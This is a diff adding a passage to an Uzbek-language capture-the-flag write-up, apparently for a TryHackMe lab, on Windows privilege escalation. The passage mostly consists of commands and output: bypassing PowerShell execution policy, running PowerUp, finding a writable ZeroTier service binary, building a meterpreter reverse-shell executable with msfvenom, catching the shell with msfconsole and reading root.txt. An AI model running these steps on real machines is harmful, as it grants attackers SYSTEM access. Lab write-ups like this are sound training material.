@@ -657,3 +657,53 @@ Bu uchun bizga kerak bo'ladigan 3ta dastur.
 - [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) (ADni keng qamrovli enum qilish)
 - [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) (Mahalliy Windows tizimidagi privilege escalation zaifliklarini aniqlash)
 - Sharphound (Bloodhound uchun grafik yig'ish)
+
+Birinchi PowerUP orqali prevesc uchun yo'l qidiramiz.
+```
+PS C:\Users\bitbucket\Documents> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass                                                                                                                                                     Execution Policy Change                                                                                                 The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose   you to the security risks described in the about_Execution_Policies help topic at                                       https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?                              [Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): y                               PS C:\Users\bitbucket\Documents> Import-Module .\PowerUp.ps1                                                            PS C:\Users\bitbucket\Documents> Invoke-AllChecks    
+```
+Taqdim etilgan javobning kerakli qismi:
+```
+ServiceName    : zerotieroneservice                                                                                     Path           : C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe                                        ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\Zero Tier; IdentityReference=BUILTIN\Users;                                     Permissions=System.Object[]}                                                                           StartName      : LocalSystem                                                                                            AbuseFunction  : Write-ServiceBinary -Name 'zerotieroneservice' -Path <HijackPath>                                      CanRestart     : True                                                                                                   Name           : zerotieroneservice                                                                                     Check          : Unquoted Service Paths 
+```
+Binary faylinining huquqlarini teskhiramiz.
+```
+PS C:\Program Files (x86)\Zero Tier> icacls '.\Zero Tier One\ZeroTier One.exe'                                          .\Zero Tier One\ZeroTier One.exe BUILTIN\Users:(I)(W)                                                                                                    NT AUTHORITY\SYSTEM:(I)(F)                                                                                              BUILTIN\Administrators:(I)(F)                                                                                           BUILTIN\Users:(I)(RX)                                                                                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)                                                                                                                                      Successfully processed 1 files; Failed processing 0 files   
+```
+Amashtira olamiz. Endi `msfvenom` da payload tayyorlaymiz.
+```
+┌──(me262㉿turkestan)-[~/Documents/TOOLS]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.190.26 LPORT=4444 -f exe > "ZeroTier One.exe"   
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+```
+Almashtirib servisga restart berishimiz kifoya!
+Qabul qilish:
+```
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.190.26
+run
+```
+
+Root.txt olish:
+```
+msf exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.190.26:4444 
+[*] Sending stage (203846 bytes) to 10.48.150.50
+[*] Meterpreter session 11 opened (192.168.190.26:4444 -> 10.48.150.50:51369) at 2025-12-24 17:42:33 +0500
+
+meterpreter > shell
+Process 6688 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1817]
+(c) 2018 Microsoft Corporation. All rights reserved
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+THM{redacted}
+```
